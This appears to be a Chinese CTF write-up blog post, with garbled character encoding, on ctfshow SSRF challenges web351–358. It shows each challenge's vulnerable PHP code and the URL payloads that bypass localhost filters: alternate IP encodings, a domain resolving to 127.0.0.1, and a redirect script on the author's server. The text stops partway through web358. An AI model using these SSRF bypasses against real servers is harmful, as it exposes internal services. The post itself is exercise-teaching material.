      <url>/2021/08/31/ctfshow-zhi-ssrf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰</p><p> <a href="https://ctf-wiki.org/web/ssrf/" target="_blank" rel="noopener">https://ctf-wiki.org/web/ssrf/</a></p><p><a href="https://www.freebuf.com/articles/web/260806.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/260806.html</a></p><h1 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//åˆå§‹åŒ– cURL ä¼šè¯</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å¯ç”¨æ—¶ä¼šå°†å¤´æ–‡ä»¶çš„ä¿¡æ¯ä½œä¸ºæ•°æ®æµè¾“å‡ºã€‚</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥æ–‡ä»¶æµçš„å½¢å¼è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//æ‰§è¡Œ cURL ä¼šè¯</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å…³é—­ cURL ä¼šè¯</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ssrfå°±æ˜¯åˆ©ç”¨æˆ‘ä»¬å¯ä»¥è®¿é—®åˆ°çš„æœåŠ¡å™¨ï¼Œå¯¹å…¶æœåŠ¡å™¨ä¸‹é¢çš„å†…ç½‘è¿›è¡Œæ¢æµ‹ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºæœåŠ¡å™¨æ‹¥æœ‰å¤–ç½‘ipï¼Œè€Œæˆ‘ä»¬è¦è®¿é—®çš„ç”µè„‘åˆ™æ˜¯åœ¨å…¬ç½‘ipè¿›è¡Œnatååˆ†é…çš„å†…ç½‘ip</p><p><code>payloadï¼šurl=127.0.0.1/flag.php</code></p><h1 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è§£æä¸€ä¸ª URL å¹¶è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«åœ¨ URL ä¸­å‡ºç°çš„å„ç§ç»„æˆéƒ¨åˆ†ã€‚</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//æˆ–</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//è¿™é‡Œåº”è¯¥è®¾ç½®åŒ¹é…çš„å¯¹è±¡</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210908085752772.png" alt="image-20210908085752772"></p><p><a href="https://www.cnblogs.com/tr1ple/p/11137159.html" target="_blank" rel="noopener">parse_urlå°ç»“</a></p><p><strong>payloadï¼š</strong></p><pre><code>url=http://0/flag.phpurl=http://0.0.0.0/flag.phpurl=http://0x7f.0.0.1/flag.phpurl=http://0177.0.0.1/flag.php</code></pre><h1 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/localhost|127\.0\.|\ã€‚/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payloadï¼š</strong></p><pre><code>url=http://0/flag.phpurl=http://127.1/flag.phpurl=http://0x7f.0.0.1/flag.phpurl=http://0177.0.0.1/flag.php</code></pre><h1 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/localhost|1|0|ã€‚/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php">å¥‡æ·«å·§æŠ€ï¼šå°†åŸŸåAç±»æŒ‡å‘<span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token function">http</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">//sudo.cc/æŒ‡å‘127.0.0.1</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//sudo.cc/flag.php</span>ä¹Ÿå¯ä»¥<span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span>"Location<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/flag.php");</span><span class="token shell-comment comment"># POST: url=http:</span><span class="token comment" spellcheck="true">//your-domain/ssrf.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¤šäº†ä¸€ä¸ªé™åˆ¶è®©hostä½æ•°å°äº5ï¼š</p><pre><code>url=http://0/flag.phpurl=http://127.1/flag.php</code></pre><h1 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°äº3ï¼š<code>url=http://0/flag.php</code></p><h1 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;/br>'</span><span class="token punctuation">.</span><span class="token variable">$ip</span><span class="token punctuation">.</span><span class="token string">'&lt;/br>'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token constant">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token constant">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'ip!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'scheme'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>filter_var â€” ä½¿ç”¨ç‰¹å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤ä¸€ä¸ªå˜é‡</p><p><a href="https://www.runoob.com/php/filter-validate-ip.html" target="_blank" rel="noopener">PHP FILTER_VALIDATE_IP è¿‡æ»¤å™¨</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210908093219443.png" alt="image-20210908093219443"></p><p>è¢«ä¿ç•™ipåœ°å€åŒä¸Š</p><p>æˆ‘çš„vpsä¸åœ¨ä¿ç•™ipå’Œç§æœ‰ipèŒƒå›´å†…ï¼Œæ‰€ä»¥åœ¨/var/www/htmlç›®å½•ä¸‹å†™ä¸€ä¸ªssrf.phpï¼Œå°±èƒ½ç»•è¿‡ï¼Œä¹‹æ‰€ä»¥è¿™ä¹ˆè¿‡æ»¤ï¼Œä¹Ÿç®—æ˜¯é¢„é˜²ssrfçš„ä¸€ä¸ªæ–¹å¼</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span>"Location<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/flag.php");</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210908093812779.png" alt="image-20210908093812779"></p><h1 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 